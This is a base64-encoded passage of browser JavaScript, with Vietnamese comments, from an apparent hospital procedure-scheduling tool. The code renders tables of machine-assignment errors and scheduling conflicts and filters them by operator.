gJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAvLyBUaMOqbSBiw6FjIHPhu7kNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJvY2VkdXJlRGF0ZSB8fCBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogc3RhcnQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIGVuZFRpbWU6IGVuZD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgbWFjaGluZUNvZGU6IG1hY2hpbmVDb2RlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6MgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIGfhuq9uIHNhaSBtw6F5DQpmdW5jdGlvbiBkaXNwbGF5TWFjaGluZUVycm9ycygpIHsNCiAgICBjb25zdCBtYWNoaW5lRXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yTG9nJyk7DQogICAgY29uc3QgbWFjaGluZUVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lRXJyb3JTZWN0aW9uJyk7DQogICAgDQogICAgaWYgKG1hY2hpbmVFcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lRXJyb3JTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoyBtw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IubWFjaGluZUNvZGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICA8L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWFjaGluZUVycm9yU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgeHVuZyDEkeG7mXQgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKSB7DQogICAgY29uc3QgbWFjaGluZUNvbmZsaWN0TG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdExvZycpOw0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0U2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyB4dW5nIMSR4buZdCBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KCQkJCTx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCgkJCQk8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gR+G7o2kgw70gZ2nhu508L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICANCgkJLy9UaMOqbSBkw7JuZyB0aMO0bmcgdGluIHbhu4EgbcOheSB2w6AgbmfDoHkgeHVuZyDEkeG7mXQgY2jGsGEgbOG7jWMNCiAgICAgICAvLyBodG1sICs9IGANCiAgICAgLy8gPHRyIGNsYXNzPSJlcnJvci1yb3ciIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmM2NkOyI+DQogICAgICAvLyAgICAgPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzg1NjQwNDsiPg0KICAgICAgIC8vICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiPjwvaT4gDQogICAgICAgLy8gICAgICBYVU5HIMSQ4buYVCBNw4FZOiAke2NvbmZsaWN0Lm1hY2hpbmVDb2RlfSAtIE5Hw4BZOiAke2NvbmZsaWN0LmRhdGV9DQogICAgIC8vICAgICAgIDwvdGQ+DQogICAgIC8vLyAgIDwvdHI+YDsNCiAgICAgICANCiAgICAgICAgY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmZvckVhY2goKHByb2MsIGluZGV4KSA9PiB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9Ij4ke2NvbmZsaWN0Lm1hY2hpbmVDb2RlfTwvdGQ+YCA6ICcnfQ0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3Byb2MucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQoJCQkJIDx0ZD48Y2VudGVyPiR7Y29uZmxpY3QuZGF0ZX0gPGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSDihpIgJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCgkJCQkgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7cHJvYy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9IiBjbGFzcz0idGltZS1zdWdnZXN0aW9uIiBpZD0ibWFjaGluZVN1Z2dlc3Rpb24tJHtjb25mbGljdC5tYWNoaW5lQ29kZX0tJHtjb25mbGljdC5kYXRlfSI+DQogICAgICAgICAgDQogICAgICAgICAgICA8L3RkPmAgOiAnJ30NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSk7DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iJHtzaG93RG9jdG9yID8gJzcnIDogJzYnfSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoIGdp4buvYSBjw6FjIG5ow7NtIHh1bmcgxJHhu5l0DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iNSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWFjaGluZUNvbmZsaWN0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNYWNoaW5lQ29uZmxpY3RPcGVyYXRvckZpbHRlcigpOw0KCQ0KCSAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgIH0sIDEwMCk7DQoJDQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gbOG7l2kgbcOheQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZU9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1hY2hpbmVFcnJvckxvZy5tYXAoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZU9wZXJhdG9yU2VsZWN0Jyk7DQogICAgDQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8geHVuZyDEkeG7mXQgbcOheQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQobWFjaGluZUNvbmZsaWN0TG9nLmZsYXRNYXAoY29uZmxpY3QgPT4gDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5tYXAocHJvYyA9PiBwcm9jLm9wZXJhdG9yKQ0KICAgICkpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIGzhu5dpIG3DoXkgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJNYWNoaW5lRXJyb3JzQnlPcGVyYXRvcigpIHsNCiAgICBjb25zdCBvcGVyYXRvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtYWNoaW5lRXJyb3JMb2cgDQogICAgICAgIDogbWFjaGluZUVycm9yTG9nLmZpbHRlcihlcnJvciA9PiBlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykpOw0KICAgIA0KICAgIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBM4buNYyB4dW5nIMSR4buZdCBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWFjaGluZUNvbmZsaWN0c0J5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZENvbmZsaWN0cyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtYWNoaW5lQ29uZmxpY3RMb2cgDQogICAgICAgIDogbWFjaGluZUNvbmZsaWN0TG9nLmZpbHRlcihjb25mbGljdCA9PiANCiAgICAgICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5zb21lKHByb2MgPT4gDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICAgICAgICAgICkNCiAgICAgICAgKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lQ29uZmxpY3RzKGZpbHRlcmVkQ29uZmxpY3RzKTsNCiAgICANCiAgICAvLyBH4buNaSBs4bqhaSBow6BtIHThuqFvIGfhu6NpIMO9IGdp4budIHNhdSBraGkgbOG7jWMNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgZ2VuZXJhdGVNYWNoaW5lVGltZVN1Z2dlc3Rpb25zKCk7DQogICAgfSwgMTAwKTsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIGzhu5dpIG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IG1hY2hpbmVFcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lRXJyb3JMb2cnKTsNCiAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lRXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgZ+G6r24gc2FpIG3DoXkgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoyBtw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5tYWNoaW5lQ29kZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gPCEtLSDEkMOjIMSRxrDhu6NjIGPhuq1wIG5o4bqtdCB24bubaSB0aMO0bmcgYsOhbyBj4bulIHRo4buDIC0tPg0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgeHVuZyDEkeG7mXQgbcOheSDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lQ29uZmxpY3RzKGZpbHRlcmVkQ29uZmxpY3RzKSB7DQogICAgY29uc3QgbWFjaGluZUNvbmZsaWN0TG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdExvZycpOw0KICAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICBpZiAoZmlsdGVyZWRDb25mbGljdHMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyB4dW5nIMSR4buZdCBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KCQkJCTx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCgkJCQkgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCgkJCQkgDQoJCQkJIA0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R